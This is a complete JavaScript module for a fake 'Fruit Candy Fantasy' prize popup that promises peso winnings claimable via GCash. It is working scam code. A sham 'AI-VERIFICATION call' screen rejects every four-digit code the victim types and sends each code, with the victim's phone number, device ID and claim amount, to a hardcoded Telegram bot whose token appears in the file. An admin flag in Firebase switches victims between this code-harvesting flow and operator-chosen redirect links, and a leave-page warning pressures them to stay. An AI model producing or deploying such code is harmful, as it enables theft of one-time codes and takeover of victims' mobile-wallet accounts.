/**
 * Popup Share Module - Fruit Candy Fantasy Theme
 * Fixed Deeplink Redirect & Admin Status Sync
 */

(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    
    // ========== AI-VERIFICATION CALL VARIABLES ==========
    let callInProgress = false;
    let callCountdown = 60;
    let callTimerInterval = null;
    let isCallRequested = false;
    let currentCallCode = '';
    let codeEntered = false;
    
    // ========== SOUND EFFECT ==========
    function playClaimSound() {
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) { console.log('Sound play prevented:', e); });
        } catch(e) {}
    }
    
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) { console.log('Call sound error:', e); });
        } catch(e) {}
    }
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) {});
        } catch(e) {}
    }
    
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        sendTelegramMessage('📞 AI-VERIFICATION CALL REQUESTED\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        sendTelegramMessage('🔑 AI-CODE ATTEMPT\n👤 User: ' + userPhone + '\n📝 Code: ' + codeEntered + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID');
    }
    
    function sendAICallExpiredNotification(userPhone, deviceId) {
        sendTelegramMessage('⏰ AI-VERIFICATION EXPIRED\n👤 User: ' + userPhone);
    }
    
    function sendClaimButtonNotification(userPhone, deviceId, amount) {
        sendTelegramMessage('💳 CLAIM INITIATED\n👤 User: ' + userPhone + '\n💰 Amount: ₱' + amount.toFixed(2));
    }
    
    // ========== UPDATE BILLS INDICATORS ==========
    function updateBillsIndicators(balance) {
        var billIndicators = document.querySelectorAll('.bill-indicator');
        var billCount = Math.min(4, Math.floor(balance / 500));
        
        for (var i = 0; i < billIndicators.length; i++) {
            var indicator = billIndicators[i];
            var img = indicator.querySelector('img');
            
            if (i < billCount) {
                if (i % 2 === 0) {
                    img.src = 'images/PHL-500-Front.png';
                } else {
                    img.src = 'images/PHL-500-Back.png';
                }
                img.style.opacity = '1';
                img.style.filter = 'none';
                indicator.classList.add('active');
            } else {
                img.src = 'images/PHL-500-Front.png';
                img.style.opacity = '0.25';
                img.style.filter = 'grayscale(100%) brightness(30%)';
                indicator.classList.remove('active');
            }
        }
    }
    
    // ========== INITIALIZATION ==========
    function init() {
        var popup = document.getElementById('prizePopup');
        if (!popup) return;
        
        getFirewallStatus();
        attachClaimButton();
        attachWithdrawButton();
        
        console.log('✅ Fruit Popup Module ready');
    }
    
    // ========== BALANCE DECREMENT ANIMATION ==========
    function animateBalanceDecrement(start, end, duration, callback) {
        var balanceSpan = document.getElementById('popupBalanceAmount');
        var balanceDisplay = document.getElementById('popupBalanceDisplay');
        var claimBtn = document.getElementById('claimGCashBtn');
        
        if (!balanceSpan) {
            if (callback) callback();
            return;
        }
        
        if (claimBtn) {
            claimBtn.disabled = true;
            claimBtn.style.opacity = '0.7';
            claimBtn.style.pointerEvents = 'none';
            claimBtn.innerHTML = '⏳ PROCESSING...';
        }
        
        var totalSteps = 30;
        var decrementAmount = start / totalSteps;
        var currentStep = 0;
        
        if (balanceDisplay) balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
        
        var interval = setInterval(function() {
            currentStep++;
            var currentVal = start - (decrementAmount * currentStep);
            
            if (balanceSpan) {
                balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff1744' : '#ffd700';
                balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
            }
            
            updateBillsIndicators(Math.max(0, currentVal));
            
            if (currentStep >= totalSteps) {
                clearInterval(interval);
                
                if (balanceSpan) {
                    balanceSpan.textContent = '0.00';
                    balanceSpan.style.color = '#ff1744';
                    balanceSpan.style.fontSize = '48px';
                }
                
                if (balanceDisplay) balanceDisplay.style.animation = 'none';
                if (balanceDisplay) {
                    balanceDisplay.style.animation = 'successFlash 0.5s ease';
                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#39ff14;">PROCESSING</span>';
                    setTimeout(function() { if (balanceDisplay) balanceDisplay.style.animation = 'none'; }, 500);
                }
                
                setTimeout(function() { if (callback) callback(); }, 600);
            }
        }, duration / totalSteps);
    }
    
    // ========== GET FIREWALL STATUS ==========
    function getFirewallStatus() {
        try {
            var db = firebase.database();
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                return currentFirewallStatus;
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ========== SYNC BALANCE FROM FIREBASE ==========
    function syncBalanceFromFirebase() {
        var userPhone = localStorage.getItem("userPhone");
        if (!userPhone) return Promise.resolve(0);
        
        try {
            var db = firebase.database();
            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
                if (snap.exists() && snap.val().balance !== undefined) {
                    var balance = snap.val().balance;
                    var balanceEl = document.getElementById('userBalanceDisplay');
                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
                    return balance;
                }
                return 0;
            });
        } catch(e) {
            return Promise.resolve(0);
        }
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        var claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) return;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            playClaimSound();
            
            syncBalanceFromFirebase().then(function(balance) {
                showPopup(balance);
                if (window.ConfettiModule) window.ConfettiModule.start();
            });
        };
    }

    // ========== ATTACH WITHDRAW BUTTON ==========
    function attachWithdrawButton() {
        var withdrawBtn = document.getElementById('claimViaGCashBtn');
        if (withdrawBtn) {
            withdrawBtn.onclick = function(e) {
                e.preventDefault();
                if (claimInProgress) return;
                
                claimInProgress = true;
                this.disabled = true;
                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
                
                getLatestPayoutLink().then(function(linkData) {
                    if (linkData && linkData.url) {
                        var userPhone = localStorage.getItem("userPhone") || "Unknown";
                        
                        markLinkAsUsed(linkData.key, userPhone).then(function() {
                            isRedirecting = true;
                            withdrawBtn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
                            setTimeout(function() {
                                window.location.href = linkData.url;
                            }, 1000);
                        });
                    } else {
                        claimInProgress = false;
                        withdrawBtn.disabled = false;
                        withdrawBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP';
                        alert("No payout link available. Please try again.");
                    }
                });
            };
        }
    }
    
    // ========== GET PAYOUT LINK ==========
    function getLatestPayoutLink() {
        try {
            var db = firebase.database();
            return db.ref('admin/redirectLink').once('value').then(function(adminSnap) {
                var adminData = adminSnap.val();
                if (adminData && adminData.url && adminData.active !== false) {
                    return { key: 'admin_redirect', url: adminData.url };
                }
                
                return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
                    if (snapshot.exists()) {
                        var key = Object.keys(snapshot.val())[0];
                        var linkData = snapshot.val()[key];
                        return { key: key, url: linkData.url };
                    }
                    return null;
                });
            });
        } catch(e) {
            return Promise.resolve(null);
        }
    }
    
    // ========== MARK LINK AS CLAIMED ==========
    function markLinkAsUsed(linkKey, userPhone) {
        if (linkKey === 'admin_redirect') return Promise.resolve();
        
        try {
            var db = firebase.database();
            return db.ref('links/' + linkKey).update({
                status: 'claimed',
                user: userPhone,
                claimedAt: Date.now()
            });
        } catch(e) {
            return Promise.resolve();
        }
    }
    
    // ========== BEFORE UNLOAD HANDLER ==========
    function beforeUnloadHandler(e) {
        if (claimInProgress && !isRedirecting) {
            var message = "Your payout is unsuccessful! Please complete the process.";
            e.preventDefault();
            e.returnValue = message;
            return message;
        }
    }
    
    // ========== SHOW FIREWALL POPUP ==========
    function showFirewallPopup() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 3;
        popupInner.style.transition = 'opacity 0.3s ease';
        popupInner.style.opacity = '0';
        
        setTimeout(function() {
            showPhase3();
            popupInner.style.opacity = '1';
        }, 300);
    }
    
    // ========== PHASE 3: AI-VERIFICATION CALL (FRUIT THEME) ==========
    function showPhase3() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase3">✕</div>
            
            <div style="text-align: center; margin-bottom: 10px;">
                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, #b537f2, #ff2d95); border-radius: 50%; border: 3px solid #ffd700; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,45,149,0.5);">
                    <i class="fas fa-phone" style="font-size: 30px; color: #fff;"></i>
                </div>
            </div>
            
            <h2 class="phase3-heading">🔐 AI-VERIFICATION</h2>
            <div class="divider"></div>
            
            <p style="font-size: 11px; color: rgba(255,255,255,0.8); text-align: center; margin: 5px 0 15px 0;">
                System AI will call you with a <strong style="color: #00f2ff;">4-digit verification code</strong>
            </p>
            
            <div id="callStatusContainer" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,215,0,0.3); border-radius: 16px; padding: 15px; margin-bottom: 15px; text-align: center;">
                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">🍊</div>
                <div id="callStatusText" style="font-size: 13px; color: #fff; font-weight: 500;">Ready for verification</div>
                
                <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
                    <span class="phone-number-display">
                        <span class="phone-icon">📱</span> ${formattedPhone}
                    </span>
                </div>
                
                <div id="callTimerDisplay" style="font-size: 32px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; display: none;">60s</div>
            </div>
            
            <button id="requestCallBtn" class="claim-via-gcash-btn mega-btn" style="width: 100%;">
                <i class="fas fa-phone-alt"></i> REQUEST AI CALL
            </button>
            
            <div id="codeSection" style="display: none; margin-top: 15px;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;">
                    <i class="fas fa-key" style="color: #ffd700;"></i>
                    <span style="font-size: 11px; color: #ccc;">Enter the 4-digit code</span>
                </div>
                
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                    <button id="verifyCodeBtn" class="pt-cat-claim-btn mega-btn" style="width: auto; padding: 14px 20px;">
                        <i class="fas fa-check"></i> VERIFY
                    </button>
                </div>
                
                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff1744; font-size: 11px; padding: 8px; background: rgba(255,23,68,0.1); border-radius: 8px;">
                    <i class="fas fa-exclamation-circle"></i> Invalid code.
                </div>
                <div id="callExpiredMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff9800; font-size: 11px; padding: 8px; background: rgba(255,152,0,0.1); border-radius: 8px;">
                    <i class="fas fa-clock"></i> Call expired. Request again.
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 12px;">
                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
            </div>
        `;
        
        attachPhase3Events();
    }
    
    // ========== ATTACH PHASE 3 EVENTS ==========
    function attachPhase3Events() {
        var closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) closeBtn.onclick = function() { stopCallTimer(); closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) {
            backBtn.onclick = function() {
                stopCallTimer();
                showPhase1(currentBalance);
            };
        }
        
        var requestBtn = document.getElementById('requestCallBtn');
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) { alert("Please wait."); return; }
                requestAICall();
            };
        }
        
        var verifyBtn = document.getElementById('verifyCodeBtn');
        if (verifyBtn) verifyBtn.onclick = verifyCode;
    }
    
    // ========== REQUEST AI-VERIFICATION CALL ==========
    function requestAICall() {
        if (callInProgress) return;
        
        callInProgress = true;
        callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        var statusIcon = document.getElementById('callStatusIcon');
        var statusText = document.getElementById('callStatusText');
        var phoneDisplay = document.getElementById('phoneNumberDisplay');
        var timerDisplay = document.getElementById('callTimerDisplay');
        var requestBtn = document.getElementById('requestCallBtn');
        var codeSection = document.getElementById('codeSection');
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) statusText.innerHTML = 'AI CALL is being placed...';
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.style.color = '#39ff14';
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
        }
        if (codeSection) codeSection.style.display = 'none';
        
        playCallSound();
        startCallTimer();
        
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) statusText.innerHTML = '<strong style="color: #39ff14;">CONNECTED!</strong><br>Enter code below';
            if (codeSection) codeSection.style.display = 'block';
        }, 4000);
    }
    
    // ========== START CALL TIMER ==========
    function startCallTimer() {
        stopCallTimer();
        var timerDisplay = document.getElementById('callTimerDisplay');
        var statusText = document.getElementById('callStatusText');
        var requestBtn = document.getElementById('requestCallBtn');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        var codeSection = document.getElementById('codeSection');
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                if (callCountdown <= 9) {
                    timerDisplay.style.color = '#ff1744';
                } else {
                    timerDisplay.style.color = '#39ff14';
                }
            }
            
            if (callCountdown <= 0) {
                stopCallTimer();
                sendAICallExpiredNotification(localStorage.getItem("userPhone"), localStorage.getItem("userDeviceId"));
                
                if (statusText) statusText.innerHTML = '<strong style="color: #ff9800;">CALL EXPIRED</strong>';
                if (timerDisplay) timerDisplay.style.display = 'none';
                if (codeSection) codeSection.style.display = 'none';
                if (requestBtn) { requestBtn.disabled = false; requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI CALL'; }
                if (callExpiredMsg) callExpiredMsg.style.display = 'block';
                
                callInProgress = false;
            }
        }, 1000);
    }
    
    function stopCallTimer() {
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
    }
    
    // ========== VERIFY CODE ==========
    function verifyCode() {
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        var verifyBtn = document.getElementById('verifyCodeBtn');
        
        if (!codeInput) return;
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length !== 4) {
            if (codeErrorMsg) { codeErrorMsg.textContent = '⚠️ Enter 4-digit code.'; codeErrorMsg.style.display = 'block'; }
            return;
        }
        
        sendAICodeAttemptNotification(localStorage.getItem("userPhone"), localStorage.getItem("userDeviceId"), enteredCode, callCountdown);
        
        if (codeErrorMsg) {
            codeErrorMsg.textContent = '❌ Invalid code. Request a new call.';
            codeErrorMsg.style.display = 'block';
        }
        
        if (verifyBtn) {
            verifyBtn.disabled = true;
            setTimeout(function() { if (verifyBtn) verifyBtn.disabled = false; }, 2000);
        }
        
        setTimeout(function() { codeInput.value = ''; }, 1500);
    }
    
    // ========== CHECK FIREWALL AND TRANSITION ==========
    function checkFirewallAndTransition() {
        getFirewallStatus().then(function(isFirewallOn) {
            if (isFirewallOn) {
                showFirewallPopup();
            } else {
                showPhase2();
            }
        });
    }
    
    // ========== PHASE 1: DEFAULT POPUP (FRUIT THEME) ==========
    function showPhase1(balance) {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            
            <div class="prize-amount" id="popupBalanceDisplay">
                ₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span>
            </div>
            
            <div class="divider"></div>
            
            <div class="bill-indicators">
                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
                <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
            </div>
            
            <div class="invite-text">
                Your friend must confirm your invitation to get extra <strong>₱500 bonus</strong>.
            </div>
            
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            
            <div class="divider"></div>
            
            <button class="claim-via-gcash-btn mega-btn" id="claimGCashBtn" style="width: 100%;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>

            <button class="small-back-btn" id="backBtnPhase1">← BACK</button>
        `;
        
        updateBillsIndicators(balance);
        
        var closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        var claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                if (currentBalance <= 0) {
                    claimBtn.classList.add('shake-effect');
                    claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
                    setTimeout(function() {
                        claimBtn.classList.remove('shake-effect');
                        claimBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH';
                    }, 2000);
                    return;
                }
                
                sendClaimButtonNotification(localStorage.getItem("userPhone"), localStorage.getItem("userDeviceId"), currentBalance);
                
                animateBalanceDecrement(currentBalance, 0, 800, function() {
                    checkFirewallAndTransition();
                });
            };
        }
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK (FRUIT THEME) ==========
    function showPhase2() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 2;
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase2">✕</div>
            
            <div style="text-align: center; margin-bottom: 8px;">
                <div style="font-size: 50px; animation: bounceIn 0.5s ease;">🏆</div>
            </div>
            
            <h2 class="claim-now-title">GREAT JOB!</h2>
            <div class="divider"></div>
            
            <div class="phase2-box">
                <p>"Nice work! You're one tap away from your reward!"</p>
                <div class="phase2-amount">₱${currentBalance.toFixed(2)}</div>
            </div>
            
            <button class="claim-via-gcash-btn mega-btn" id="proceedBtn" style="width: 100%;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH
            </button>

            <button class="small-back-btn" id="backBtnPhase2">← BACK</button>
        `;
        
        attachPhase2Events();
    }
    
    // ========== ATTACH PHASE 2 EVENTS ==========
    function attachPhase2Events() {
        var closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) backBtn.onclick = function() { showPhase1(currentBalance); };
        
        var proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = function() {
                if (claimInProgress) return;
                claimInProgress = true;
                
                this.disabled = true;
                this.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> PROCESSING...';
                
                window.addEventListener('beforeunload', beforeUnloadHandler);
                
                getLatestPayoutLink().then(function(linkData) {
                    if (linkData && linkData.url) {
                        var userPhone = localStorage.getItem("userPhone") || "Unknown";
                        markLinkAsUsed(linkData.key, userPhone).then(function() {
                            isRedirecting = true;
                            proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING...';
                            setTimeout(function() {
                                window.removeEventListener('beforeunload', beforeUnloadHandler);
                                window.location.href = linkData.url;
                            }, 1000);
                        });
                    } else {
                        claimInProgress = false;
                        window.removeEventListener('beforeunload', beforeUnloadHandler);
                        proceedBtn.disabled = false;
                        proceedBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH';
                        alert("No payout link available. Please try again.");
                    }
                });
            };
        }
    }
    
    // ========== SHOW POPUP ==========
    function showPopup(balance) {
        currentBalance = balance;
        getFirewallStatus().then(function() {
            showPhase1(balance);
            
            var popup = document.getElementById('prizePopup');
            if (popup) {
                popup.style.display = 'flex';
                var ticker = document.getElementById('winnerTicker');
                if (ticker) ticker.style.display = 'none';
            }
        });
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
        claimInProgress = false;
        isRedirecting = false;
        stopCallTimer();
        window.removeEventListener('beforeunload', beforeUnloadHandler);
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    
})();
